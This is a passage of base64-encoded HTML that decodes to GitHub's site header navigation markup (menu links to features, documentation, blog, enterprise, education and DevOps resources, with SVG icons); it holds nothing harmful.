1aDJhLjI1LjI1IDAgMCAwIC4yNS0uMjV2LTkuNVoiPjwvcGF0aD4KPC9zdmc+CiAgICAgIDxkaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29sb3ItZmctZGVmYXVsdCBoNCI+RGlzY3Vzc2lvbnM8L2Rpdj4KICAgICAgICBDb2xsYWJvcmF0ZSBvdXRzaWRlIG9mIGNvZGUKICAgICAgPC9kaXY+CgogICAgCjwvYT48L2xpPgoKICAgICAgICAgICAgPC91bD4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPGRpdiBjbGFzcz0icHgtbGctNCI+CiAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImQtYmxvY2sgaDQgY29sb3ItZmctZGVmYXVsdCBteS0xIiBpZD0icHJvZHVjdC1leHBsb3JlLWhlYWRpbmciPkV4cGxvcmU8L3NwYW4+CiAgICAgICAgICAgIDx1bCBjbGFzcz0ibGlzdC1zdHlsZS1ub25lIGY1IiBhcmlhLWxhYmVsbGVkYnk9InByb2R1Y3QtZXhwbG9yZS1oZWFkaW5nIj4KICAgICAgICAgICAgICAgIDxsaT4KICA8YSBjbGFzcz0iSGVhZGVyTWVudS1kcm9wZG93bi1saW5rIGxoLWNvbmRlbnNlZCBkLWJsb2NrIG5vLXVuZGVybGluZSBwb3NpdGlvbi1yZWxhdGl2ZSBweS0yIExpbmstLXNlY29uZGFyeSIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtIZWFkZXIgZHJvcGRvd24gKGxvZ2dlZCBvdXQpLCBQcm9kdWN0JnF1b3Q7LCZxdW90O2FjdGlvbiZxdW90OzomcXVvdDtjbGljayB0byBnbyB0byBBbGwgZmVhdHVyZXMmcXVvdDssJnF1b3Q7bGFiZWwmcXVvdDs6JnF1b3Q7cmVmX2N0YTpBbGwgZmVhdHVyZXM7JnF1b3Q7fSIgaHJlZj0iL2ZlYXR1cmVzIj4KICAgICAgQWxsIGZlYXR1cmVzCgogICAgCjwvYT48L2xpPgoKICAgICAgICAgICAgICAgIDxsaT4KICA8YSBjbGFzcz0iSGVhZGVyTWVudS1kcm9wZG93bi1saW5rIGxoLWNvbmRlbnNlZCBkLWJsb2NrIG5vLXVuZGVybGluZSBwb3NpdGlvbi1yZWxhdGl2ZSBweS0yIExpbmstLXNlY29uZGFyeSIgdGFyZ2V0PSJfYmxhbmsiIGRhdGEtYW5hbHl0aWNzLWV2ZW50PSJ7JnF1b3Q7Y2F0ZWdvcnkmcXVvdDs6JnF1b3Q7SGVhZGVyIGRyb3Bkb3duIChsb2dnZWQgb3V0KSwgUHJvZHVjdCZxdW90OywmcXVvdDthY3Rpb24mcXVvdDs6JnF1b3Q7Y2xpY2sgdG8gZ28gdG8gRG9jdW1lbnRhdGlvbiZxdW90OywmcXVvdDtsYWJlbCZxdW90OzomcXVvdDtyZWZfY3RhOkRvY3VtZW50YXRpb247JnF1b3Q7fSIgaHJlZj0iaHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20iPgogICAgICBEb2N1bWVudGF0aW9uCgogICAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1saW5rLWV4dGVybmFsIEhlYWRlck1lbnUtZXh0ZXJuYWwtaWNvbiBjb2xvci1mZy1zdWJ0bGUiPgogICAgPHBhdGggZD0iTTMuNzUgMmgzLjVhLjc1Ljc1IDAgMCAxIDAgMS41aC0zLjVhLjI1LjI1IDAgMCAwLS4yNS4yNXY4LjVjMCAuMTM4LjExMi4yNS4yNS4yNWg4LjVhLjI1LjI1IDAgMCAwIC4yNS0uMjV2LTMuNWEuNzUuNzUgMCAwIDEgMS41IDB2My41QTEuNzUgMS43NSAwIDAgMSAxMi4yNSAxNGgtOC41QTEuNzUgMS43NSAwIDAgMSAyIDEyLjI1di04LjVDMiAyLjc4NCAyLjc4NCAyIDMuNzUgMlptNi44NTQtMWg0LjE0NmEuMjUuMjUgMCAwIDEgLjI1LjI1djQuMTQ2YS4yNS4yNSAwIDAgMS0uNDI3LjE3N0wxMy4wMyA0LjAzIDkuMjggNy43OGEuNzUxLjc1MSAwIDAgMS0xLjA0Mi0uMDE4Ljc1MS43NTEgMCAwIDEtLjAxOC0xLjA0MmwzLjc1LTMuNzUtMS41NDMtMS41NDNBLjI1LjI1IDAgMCAxIDEwLjYwNCAxWiI+PC9wYXRoPgo8L3N2Zz4KPC9hPjwvbGk+CgogICAgICAgICAgICAgICAgPGxpPgogIDxhIGNsYXNzPSJIZWFkZXJNZW51LWRyb3Bkb3duLWxpbmsgbGgtY29uZGVuc2VkIGQtYmxvY2sgbm8tdW5kZXJsaW5lIHBvc2l0aW9uLXJlbGF0aXZlIHB5LTIgTGluay0tc2Vjb25kYXJ5IiB0YXJnZXQ9Il9ibGFuayIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtIZWFkZXIgZHJvcGRvd24gKGxvZ2dlZCBvdXQpLCBQcm9kdWN0JnF1b3Q7LCZxdW90O2FjdGlvbiZxdW90OzomcXVvdDtjbGljayB0byBnbyB0byBHaXRIdWIgU2tpbGxzJnF1b3Q7LCZxdW90O2xhYmVsJnF1b3Q7OiZxdW90O3JlZl9jdGE6R2l0SHViIFNraWxsczsmcXVvdDt9IiBocmVmPSJodHRwczovL3NraWxscy5naXRodWIuY29tLyI+CiAgICAgIEdpdEh1YiBTa2lsbHMKCiAgICA8c3ZnIGFyaWEtaGlkZGVuPSJ0cnVlIiBoZWlnaHQ9IjE2IiB2aWV3Qm94PSIwIDAgMTYgMTYiIHZlcnNpb249IjEuMSIgd2lkdGg9IjE2IiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0ib2N0aWNvbiBvY3RpY29uLWxpbmstZXh0ZXJuYWwgSGVhZGVyTWVudS1leHRlcm5hbC1pY29uIGNvbG9yLWZnLXN1YnRsZSI+CiAgICA8cGF0aCBkPSJNMy43NSAyaDMuNWEuNzUuNzUgMCAwIDEgMCAxLjVoLTMuNWEuMjUuMjUgMCAwIDAtLjI1LjI1djguNWMwIC4xMzguMTEyLjI1LjI1LjI1aDguNWEuMjUuMjUgMCAwIDAgLjI1LS4yNXYtMy41YS43NS43NSAwIDAgMSAxLjUgMHYzLjVBMS43NSAxLjc1IDAgMCAxIDEyLjI1IDE0aC04LjVBMS43NSAxLjc1IDAgMCAxIDIgMTIuMjV2LTguNUMyIDIuNzg0IDIuNzg0IDIgMy43NSAyWm02Ljg1NC0xaDQuMTQ2YS4yNS4yNSAwIDAgMSAuMjUuMjV2NC4xNDZhLjI1LjI1IDAgMCAxLS40MjcuMTc3TDEzLjAzIDQuMDMgOS4yOCA3Ljc4YS43NTEuNzUxIDAgMCAxLTEuMDQyLS4wMTguNzUxLjc1MSAwIDAgMS0uMDE4LTEuMDQybDMuNzUtMy43NS0xLjU0My0xLjU0M0EuMjUuMjUgMCAwIDEgMTAuNjA0IDFaIj48L3BhdGg+Cjwvc3ZnPgo8L2E+PC9saT4KCiAgICAgICAgICAgICAgICA8bGk+CiAgPGEgY2xhc3M9IkhlYWRlck1lbnUtZHJvcGRvd24tbGluayBsaC1jb25kZW5zZWQgZC1ibG9jayBuby11bmRlcmxpbmUgcG9zaXRpb24tcmVsYXRpdmUgcHktMiBMaW5rLS1zZWNvbmRhcnkiIHRhcmdldD0iX2JsYW5rIiBkYXRhLWFuYWx5dGljcy1ldmVudD0ieyZxdW90O2NhdGVnb3J5JnF1b3Q7OiZxdW90O0hlYWRlciBkcm9wZG93biAobG9nZ2VkIG91dCksIFByb2R1Y3QmcXVvdDssJnF1b3Q7YWN0aW9uJnF1b3Q7OiZxdW90O2NsaWNrIHRvIGdvIHRvIEJsb2cmcXVvdDssJnF1b3Q7bGFiZWwmcXVvdDs6JnF1b3Q7cmVmX2N0YTpCbG9nOyZxdW90O30iIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmJsb2ciPgogICAgICBCbG9nCgogICAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1saW5rLWV4dGVybmFsIEhlYWRlck1lbnUtZXh0ZXJuYWwtaWNvbiBjb2xvci1mZy1zdWJ0bGUiPgogICAgPHBhdGggZD0iTTMuNzUgMmgzLjVhLjc1Ljc1IDAgMCAxIDAgMS41aC0zLjVhLjI1LjI1IDAgMCAwLS4yNS4yNXY4LjVjMCAuMTM4LjExMi4yNS4yNS4yNWg4LjVhLjI1LjI1IDAgMCAwIC4yNS0uMjV2LTMuNWEuNzUuNzUgMCAwIDEgMS41IDB2My41QTEuNzUgMS43NSAwIDAgMSAxMi4yNSAxNGgtOC41QTEuNzUgMS43NSAwIDAgMSAyIDEyLjI1di04LjVDMiAyLjc4NCAyLjc4NCAyIDMuNzUgMlptNi44NTQtMWg0LjE0NmEuMjUuMjUgMCAwIDEgLjI1LjI1djQuMTQ2YS4yNS4yNSAwIDAgMS0uNDI3LjE3N0wxMy4wMyA0LjAzIDkuMjggNy43OGEuNzUxLjc1MSAwIDAgMS0xLjA0Mi0uMDE4Ljc1MS43NTEgMCAwIDEtLjAxOC0xLjA0MmwzLjc1LTMuNzUtMS41NDMtMS41NDNBLjI1LjI1IDAgMCAxIDEwLjYwNCAxWiI+PC9wYXRoPgo8L3N2Zz4KPC9hPjwvbGk+CgogICAgICAgICAgICA8L3VsPgogICAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2Pgo8L2xpPgoKCiAgICAgICAgICAgICAgICA8bGkgY2xhc3M9IkhlYWRlck1lbnUtaXRlbSBwb3NpdGlvbi1yZWxhdGl2ZSBmbGV4LXdyYXAgZmxleC1qdXN0aWZ5LWJldHdlZW4gZmxleC1pdGVtcy1jZW50ZXIgZC1ibG9jayBkLWxnLWZsZXggZmxleC1sZy1ub3dyYXAgZmxleC1sZy1pdGVtcy1jZW50ZXIganMtZGV0YWlscy1jb250YWluZXIganMtaGVhZGVyLW1lbnUtaXRlbSI+CiAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iSGVhZGVyTWVudS1saW5rIGJvcmRlci0wIHdpZHRoLWZ1bGwgd2lkdGgtbGctYXV0byBweC0wIHB4LWxnLTIgcHktMyBweS1sZy0yIG5vLXdyYXAgZC1mbGV4IGZsZXgtaXRlbXMtY2VudGVyIGZsZXgtanVzdGlmeS1iZXR3ZWVuIGpzLWRldGFpbHMtdGFyZ2V0IiBhcmlhLWV4cGFuZGVkPSJmYWxzZSI+CiAgICAgICAgU29sdXRpb25zCiAgICAgICAgPHN2ZyBvcGFjaXR5PSIwLjUiIGFyaWEtaGlkZGVuPSJ0cnVlIiBoZWlnaHQ9IjE2IiB2aWV3Qm94PSIwIDAgMTYgMTYiIHZlcnNpb249IjEuMSIgd2lkdGg9IjE2IiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0ib2N0aWNvbiBvY3RpY29uLWNoZXZyb24tZG93biBIZWFkZXJNZW51LWljb24gbWwtMSI+CiAgICA8cGF0aCBkPSJNMTIuNzggNS4yMmEuNzQ5Ljc0OSAwIDAgMSAwIDEuMDZsLTQuMjUgNC4yNWEuNzQ5Ljc0OSAwIDAgMS0xLjA2IDBMMy4yMiA2LjI4YS43NDkuNzQ5IDAgMSAxIDEuMDYtMS4wNkw4IDguOTM5bDMuNzItMy43MTlhLjc0OS43NDkgMCAwIDEgMS4wNiAwWiI+PC9wYXRoPgo8L3N2Zz4KICAgICAgPC9idXR0b24+CiAgICAgIDxkaXYgY2xhc3M9IkhlYWRlck1lbnUtZHJvcGRvd24gZHJvcGRvd24tbWVudSByb3VuZGVkIG0tMCBwLTAgcHktMiBweS1sZy00IHBvc2l0aW9uLXJlbGF0aXZlIHBvc2l0aW9uLWxnLWFic29sdXRlIGxlZnQtMCBsZWZ0LWxnLW4zIHB4LWxnLTQiPgogICAgICAgICAgPGRpdiBjbGFzcz0iYm9yZGVyLWJvdHRvbSBwYi0zIG1iLTMiPgogICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJkLWJsb2NrIGg0IGNvbG9yLWZnLWRlZmF1bHQgbXktMSIgaWQ9InNvbHV0aW9ucy1mb3ItaGVhZGluZyI+Rm9yPC9zcGFuPgogICAgICAgICAgICA8dWwgY2xhc3M9Imxpc3Qtc3R5bGUtbm9uZSBmNSIgYXJpYS1sYWJlbGxlZGJ5PSJzb2x1dGlvbnMtZm9yLWhlYWRpbmciPgogICAgICAgICAgICAgICAgPGxpPgogIDxhIGNsYXNzPSJIZWFkZXJNZW51LWRyb3Bkb3duLWxpbmsgbGgtY29uZGVuc2VkIGQtYmxvY2sgbm8tdW5kZXJsaW5lIHBvc2l0aW9uLXJlbGF0aXZlIHB5LTIgTGluay0tc2Vjb25kYXJ5IiBkYXRhLWFuYWx5dGljcy1ldmVudD0ieyZxdW90O2NhdGVnb3J5JnF1b3Q7OiZxdW90O0hlYWRlciBkcm9wZG93biAobG9nZ2VkIG91dCksIFNvbHV0aW9ucyZxdW90OywmcXVvdDthY3Rpb24mcXVvdDs6JnF1b3Q7Y2xpY2sgdG8gZ28gdG8gRW50ZXJwcmlzZSZxdW90OywmcXVvdDtsYWJlbCZxdW90OzomcXVvdDtyZWZfY3RhOkVudGVycHJpc2U7JnF1b3Q7fSIgaHJlZj0iL2VudGVycHJpc2UiPgogICAgICBFbnRlcnByaXNlCgogICAgCjwvYT48L2xpPgoKICAgICAgICAgICAgICAgIDxsaT4KICA8YSBjbGFzcz0iSGVhZGVyTWVudS1kcm9wZG93bi1saW5rIGxoLWNvbmRlbnNlZCBkLWJsb2NrIG5vLXVuZGVybGluZSBwb3NpdGlvbi1yZWxhdGl2ZSBweS0yIExpbmstLXNlY29uZGFyeSIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtIZWFkZXIgZHJvcGRvd24gKGxvZ2dlZCBvdXQpLCBTb2x1dGlvbnMmcXVvdDssJnF1b3Q7YWN0aW9uJnF1b3Q7OiZxdW90O2NsaWNrIHRvIGdvIHRvIFRlYW1zJnF1b3Q7LCZxdW90O2xhYmVsJnF1b3Q7OiZxdW90O3JlZl9jdGE6VGVhbXM7JnF1b3Q7fSIgaHJlZj0iL3RlYW0iPgogICAgICBUZWFtcwoKICAgIAo8L2E+PC9saT4KCiAgICAgICAgICAgICAgICA8bGk+CiAgPGEgY2xhc3M9IkhlYWRlck1lbnUtZHJvcGRvd24tbGluayBsaC1jb25kZW5zZWQgZC1ibG9jayBuby11bmRlcmxpbmUgcG9zaXRpb24tcmVsYXRpdmUgcHktMiBMaW5rLS1zZWNvbmRhcnkiIGRhdGEtYW5hbHl0aWNzLWV2ZW50PSJ7JnF1b3Q7Y2F0ZWdvcnkmcXVvdDs6JnF1b3Q7SGVhZGVyIGRyb3Bkb3duIChsb2dnZWQgb3V0KSwgU29sdXRpb25zJnF1b3Q7LCZxdW90O2FjdGlvbiZxdW90OzomcXVvdDtjbGljayB0byBnbyB0byBTdGFydHVwcyZxdW90OywmcXVvdDtsYWJlbCZxdW90OzomcXVvdDtyZWZfY3RhOlN0YXJ0dXBzOyZxdW90O30iIGhyZWY9Ii9lbnRlcnByaXNlL3N0YXJ0dXBzIj4KICAgICAgU3RhcnR1cHMKCiAgICAKPC9hPjwvbGk+CgogICAgICAgICAgICAgICAgPGxpPgogIDxhIGNsYXNzPSJIZWFkZXJNZW51LWRyb3Bkb3duLWxpbmsgbGgtY29uZGVuc2VkIGQtYmxvY2sgbm8tdW5kZXJsaW5lIHBvc2l0aW9uLXJlbGF0aXZlIHB5LTIgTGluay0tc2Vjb25kYXJ5IiB0YXJnZXQ9Il9ibGFuayIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtIZWFkZXIgZHJvcGRvd24gKGxvZ2dlZCBvdXQpLCBTb2x1dGlvbnMmcXVvdDssJnF1b3Q7YWN0aW9uJnF1b3Q7OiZxdW90O2NsaWNrIHRvIGdvIHRvIEVkdWNhdGlvbiZxdW90OywmcXVvdDtsYWJlbCZxdW90OzomcXVvdDtyZWZfY3RhOkVkdWNhdGlvbjsmcXVvdDt9IiBocmVmPSJodHRwczovL2VkdWNhdGlvbi5naXRodWIuY29tIj4KICAgICAgRWR1Y2F0aW9uCgogICAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1saW5rLWV4dGVybmFsIEhlYWRlck1lbnUtZXh0ZXJuYWwtaWNvbiBjb2xvci1mZy1zdWJ0bGUiPgogICAgPHBhdGggZD0iTTMuNzUgMmgzLjVhLjc1Ljc1IDAgMCAxIDAgMS41aC0zLjVhLjI1LjI1IDAgMCAwLS4yNS4yNXY4LjVjMCAuMTM4LjExMi4yNS4yNS4yNWg4LjVhLjI1LjI1IDAgMCAwIC4yNS0uMjV2LTMuNWEuNzUuNzUgMCAwIDEgMS41IDB2My41QTEuNzUgMS43NSAwIDAgMSAxMi4yNSAxNGgtOC41QTEuNzUgMS43NSAwIDAgMSAyIDEyLjI1di04LjVDMiAyLjc4NCAyLjc4NCAyIDMuNzUgMlptNi44NTQtMWg0LjE0NmEuMjUuMjUgMCAwIDEgLjI1LjI1djQuMTQ2YS4yNS4yNSAwIDAgMS0uNDI3LjE3N0wxMy4wMyA0LjAzIDkuMjggNy43OGEuNzUxLjc1MSAwIDAgMS0xLjA0Mi0uMDE4Ljc1MS43NTEgMCAwIDEtLjAxOC0xLjA0MmwzLjc1LTMuNzUtMS41NDMtMS41NDNBLjI1LjI1IDAgMCAxIDEwLjYwNCAxWiI+PC9wYXRoPgo8L3N2Zz4KPC9hPjwvbGk+CgogICAgICAgICAgICA8L3VsPgogICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJib3JkZXItYm90dG9tIHBiLTMgbWItMyI+CiAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImQtYmxvY2sgaDQgY29sb3ItZmctZGVmYXVsdCBteS0xIiBpZD0ic29sdXRpb25zLWJ5LXNvbHV0aW9uLWhlYWRpbmciPkJ5IFNvbHV0aW9uPC9zcGFuPgogICAgICAgICAgICA8dWwgY2xhc3M9Imxpc3Qtc3R5bGUtbm9uZSBmNSIgYXJpYS1sYWJlbGxlZGJ5PSJzb2x1dGlvbnMtYnktc29sdXRpb24taGVhZGluZyI+CiAgICAgICAgICAgICAgICA8bGk+CiAgPGEgY2xhc3M9IkhlYWRlck1lbnUtZHJvcGRvd24tbGluayBsaC1jb25kZW5zZWQgZC1ibG9jayBuby11bmRlcmxpbmUgcG9zaXRpb24tcmVsYXRpdmUgcHktMiBMaW5rLS1zZWNvbmRhcnkiIGRhdGEtYW5hbHl0aWNzLWV2ZW50PSJ7JnF1b3Q7Y2F0ZWdvcnkmcXVvdDs6JnF1b3Q7SGVhZGVyIGRyb3Bkb3duIChsb2dnZWQgb3V0KSwgU29sdXRpb25zJnF1b3Q7LCZxdW90O2FjdGlvbiZxdW90OzomcXVvdDtjbGljayB0byBnbyB0byBDSS9DRCAmYW1wO2FtcDsgQXV0b21hdGlvbiZxdW90OywmcXVvdDtsYWJlbCZxdW90OzomcXVvdDtyZWZfY3RhOkNJL0NEICZhbXA7YW1wOyBBdXRvbWF0aW9uOyZxdW90O30iIGhyZWY9Ii9zb2x1dGlvbnMvY2ktY2QvIj4KICAgICAgQ0kvQ0QgJmFtcDsgQXV0b21hdGlvbgoKICAgIAo8L2E+PC9saT4KCiAgICAgICAgICAgICAgICA8bGk+CiAgPGEgY2xhc3M9IkhlYWRlck1lbnUtZHJvcGRvd24tbGluayBsaC1jb25kZW5zZWQgZC1ibG9jayBuby11bmRlcmxpbmUgcG9zaXRpb24tcmVsYXRpdmUgcHktMiBMaW5rLS1zZWNvbmRhcnkiIHRhcmdldD0iX2JsYW5rIiBkYXRhLWFuYWx5dGljcy1ldmVudD0ieyZxdW90O2NhdGVnb3J5JnF1b3Q7OiZxdW90O0hlYWRlciBkcm9wZG93biAobG9nZ2VkIG91dCksIFNvbHV0aW9ucyZxdW90OywmcXVvdDthY3Rpb24mcXVvdDs6JnF1b3Q7Y2xpY2sgdG8gZ28gdG8gRGV2T3BzJnF1b3Q7LCZxdW90O2xhYmVsJnF1b3Q7OiZxdW90O3JlZl9jdGE6RGV2T3BzOyZxdW90O30iIGhyZWY9Imh0dHBzOi8vcmVzb3VyY2VzLmdpdGh1Yi5jb20vZGV2b3BzLyI+CiAgICAgIERldk9wcwoKICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMTYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24tbGluay1leHRlcm5hbCBIZWFkZXJNZW51LWV4dGVybmFsLWljb24gY29sb3ItZmctc3VidGxlIj4KICAgIDxwYXRoIGQ9Ik0zLjc1IDJoMy41YS43NS43NSAwIDAgMSAwIDEuNWgtMy41YS4yNS4yNSAwIDAgMC0uMjUuMjV2OC41YzAgLjEzOC4xMTIuMjUuMjUuMjVoOC41YS4yNS4yNSAwIDAgMCAuMjUtLjI1di0zLjVhLjc1Ljc1IDAgMCAxIDEuNSAwdjMuNUExLjc1IDEuNzUgMCAwIDEgMTIuMjUgMTRoLTguNUExLjc1IDEuNzUgMCAwIDEgMiAxMi4yNXYtOC41QzIgMi43ODQgMi43ODQgMiAzLjc1IDJabTYuODU0LTFoNC4xNDZhLjI1LjI1IDAgMCAxIC4yNS4yNXY0LjE0NmEuMjUuMjUgMCAwIDEtLjQyNy4xNzdMMTMuMDMgNC4wMyA5LjI4IDcuNzhhLjc1MS43NTEgMCAwIDEtMS4wNDItLjAxOC43NTEuNzUxIDAgMCAxLS4wMTgtMS4wNDJsMy43NS0zLjc1LTEuNTQzLTEuNTQzQS4yNS4yNSAwIDAgMSAxMC42MDQgMVoiPjwvcGF0aD4KPC9zdmc+CjwvYT48L2xpPgoKICAgICAgICAgICAgICAgIDxsaT4KICA8YSBjbGFzcz0iSGVhZGVyTWVudS1kcm9wZG93bi1saW5rIGxoLWNvbmRlbnNlZCBkLWJsb2NrIG5vLXVuZGVybGluZSBwb3NpdGlvbi1yZWxhdGl2ZSBweS0yIExpbmstLXNlY29uZGFyeSIgdGFyZ2V0PSJfYmxhbmsiIGRhdGEtYW5hbHl0aWNzLWV2ZW50PSJ7JnF1b3Q7Y2F0ZWdvcnkmcXVvdDs6JnF1b3Q7SGVhZGVyIGRyb3Bkb3duIChsb2dnZWQgb3V0KSwgU29sdXRpb25zJnF1b3Q7LCZxdW90O2FjdGlvbiZxdW90OzomcXVvdDtjbGljayB0byBnbyB0byBEZXZTZWNPcHMmcXVvdDssJnF1b3Q7bGFiZWwmcXVvdDs6JnF1b3Q7cmVmX2N0YTpEZXZTZWNPcHM7JnF1b3Q7fSIgaHJlZj0iaHR0cHM6Ly9yZXNvdXJjZXMuZ2l0aHViLmNvbS9kZXZvcHMvZnVuZGFtZW50YWxzL2RldnNlY29wcy8iPgogICAgICBEZXZTZWNPcHMKCiAgICA8c3ZnIGFyaWEtaGlkZGVuPSJ0cnVlIiBoZWlnaHQ9IjE2IiB2aWV3Qm94PSIwIDAgMTYgMTYiIHZlcnNpb249IjEuMSIgd2lkdGg9IjE2IiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0ib2N0aWNvbiBvY3RpY29uLWxpbmstZXh0ZXJuYWwgSGVhZGVyTWVudS1leHRlcm5hbC1pY29uIGNvbG9yLWZnLXN1YnRsZSI+CiAgICA8cGF0aCBkPSJNMy43NSAyaDMuNWEuNzUuNzUgMCAwIDEgMCAxLjVoLTMuNWEuMjUuMjUgMCAwIDAtLjI1LjI1djguNWMwIC4xMzguMTEyLjI1LjI1LjI1aDguNWEuMjUuMjUgMCAwIDAgLjI1LS4yNXYtMy41YS43NS43NSAwIDAgMSAxLjUgMHYzLjVBMS43NSAxLjc1IDAgMCAxIDEyLjI1IDE0aC04LjVBMS43NSAxLjc1IDAgMCAxIDIgMTIuMjV2LTguNUMyIDIuNzg0IDIuNzg0IDIgMy43NSAyWm02Ljg1NC0xaDQuMTQ2YS4yNS4yNSAwIDAgMSAuMjUuMjV2NC4xNDZhLjI1LjI1IDAgMCAxLS40MjcuMTc3TDEzLjAzIDQuMDMgOS4yOCA3Ljc4YS43NTEuNzUxIDAgMCAxLTEuMDQyLS4wMTguNzUxLjc1MSAwIDAgMS0uMDE4LTEuMDQybDMuNzUtMy43NS0xLjU0My0xLjU0M0EuMjUuMjUgMCAwIDEgMTAuNjA0IDFaIj48L3BhdGg+Cjwvc3ZnPgo8L2E+PC9saT4KCiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDxkaXYgY2xhc3M9IiI+CiAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImQtYmxvY2sgaDQgY29sb3ItZmctZGVmYXVsdCBteS0xIiBpZD0ic29sdXRpb25zLXJlc291cmNlcy1oZWFkaW5nIj5SZXNvdXJjZXM8L3NwYW4+CiAgICAgICAgICAgIDx1bCBjbGFzcz0ibGlzdC1zdHlsZS1ub25lIGY1IiBhcmlhLWxhYmVsbGVkYnk9InNvbHV0aW9ucy1yZXNvdXJjZXMtaGVhZGluZyI+CiAgICAgICAgICAgICAgICA8bGk+CiAgPGEgY2xhc3M9IkhlYWRlck1lbnUtZHJvcGRvd24tbGluayBsaC1jb25kZW5zZWQgZC1ibG9jayBuby11bmRlcmxpbmUgcG9zaXRpb24tcmVsYXRpdmUgcHktMiBMaW5rLS1zZWNvbmRhcnkiIHRhcmdldD0iX2JsYW5rIiBkYXRhLWFuYWx5dGljcy1ldmVudD0ieyZxdW90O2NhdGVnb3J5JnF1b3Q7OiZxdW90O0hlYWRlciBkcm9wZG93biAobG9nZ2VkIG91dCksIFNvbHV0aW9ucyZxdW90OywmcXVvdDthY3Rpb24mcXVvdDs6JnF1b3Q7Y2xpY2sgdG8gZ28gdG8gTGVhcm5pbmcgUGF0aHdheXMmcXVvdDssJnF1b3Q7bGFiZWwmcXVvdDs6JnF1b3Q7cmVmX2N0YTpMZWFybmluZyBQYXRod2F5czsmcXVvdDt9IiBocmVmPSJodHRwczovL3Jlc291cmNlcy5naXRodWIuY29tL2xlYXJuL3BhdGh3YXlzLyI+CiAgICAgIExlYXJuaW5nIFBhdGh3YXlzCgogICAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1saW5rLWV4dGVybmFsIEhlYWRlck1lbnUtZXh0ZXJuYWwtaWNvbiBjb2xvci1mZy1zdWJ0bGUiPgogICAgPHBhdGggZD0iTTMuNzUgMmgzLjVhLjc1Ljc1IDAgMCAxIDAgMS41aC0zLjVhLjI1LjI1IDAgMCAwLS4yNS4yNXY4LjVjMCAuMTM4LjExMi4yNS4yNS4yNWg4LjVhLjI1LjI1IDAgMCAwIC4yNS0uMjV2LTMuNWEuNzUuNzUgMCAwIDEgMS41IDB2My41QTEuNzUgMS43NSAwIDAgMSAxMi4yNSAxNGgtOC41QTEuNzUgMS43NSAwIDAgMSAyIDEyLjI1di04LjVDMiAyLjc4NCAyLjc4NCAyIDMuNzUgMlptNi44NTQtMWg0LjE0NmEuMjUuMjUgMCAwIDEgLjI1LjI1djQuMTQ2YS4yNS4yNSAwIDAgMS0uNDI3LjE3N0wxMy4wMyA0LjAzIDkuMjggNy43OGEuNzUxLjc1MSAwIDAgMS0xLjA0Mi0uMDE4Ljc1MS43NTEgMCAwIDEtLjAxOC0xLjA0MmwzLjc1LTMuNzUtMS41NDMtMS41NDNBLjI1LjI1IDAgMCAxIDEwLjYwNCAxWiI+PC9wYXRoPgo8L3N2Zz4KPC9hPjwvbGk+CgogICAgICAgICAgICAgICAgPGxpPgogIDxhIGNsYXNzPSJIZWFkZXJNZW51LWRyb3Bkb3duLWxpbmsgbGgtY29uZGVuc2VkIGQtYmxvY2sgbm8tdW5kZXJsaW5lIHBvc2l0aW9uLXJlbGF0aXZlIHB5LTIgTGluay0tc2Vjb25kYXJ5IiB0YXJnZXQ9Il9ibGFuayIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtIZWFkZXIgZHJvcGRvd24gKGxvZ2dlZCBvdXQpLCBTb2x1dGlvbnMmcXVvdDssJnF1b3Q7YWN0aW9uJnF1b3